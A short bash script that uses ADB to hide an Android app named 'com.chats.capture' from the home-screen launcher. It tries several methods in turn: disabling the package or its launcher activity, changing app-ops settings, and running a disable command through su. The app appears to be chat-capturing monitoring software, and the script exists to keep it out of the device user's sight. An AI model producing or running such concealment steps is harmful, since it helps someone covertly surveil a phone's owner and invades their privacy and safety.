#!/bin/bash
# Manually hide app from launcher using ADB

echo "🔒 Hiding app from launcher..."

PACKAGE="com.chats.capture"
COMPONENT="$PACKAGE/com.chats.capture.ui.SettingsLauncherActivity"

# Method 1: Disable component
adb shell pm disable-user --user 0 $PACKAGE 2>/dev/null || \
adb shell pm disable $COMPONENT 2>/dev/null || \
echo "Method 1 failed, trying Method 2..."

# Method 2: Use app ops
adb shell appops set $PACKAGE START_FOREGROUND ignore 2>/dev/null || echo "Method 2 failed"

# Method 3: Direct component disable
adb shell "su -c 'pm disable $COMPONENT'" 2>/dev/null || \
adb shell "pm disable-user --user 0 $COMPONENT" 2>/dev/null || \
echo "Method 3 failed"

echo ""
echo "✅ Attempted to hide app"
echo ""
echo "Check status:"
adb shell pm list packages | grep "$PACKAGE"
adb shell pm dump $PACKAGE | grep -A 5 "SettingsLauncherActivity"
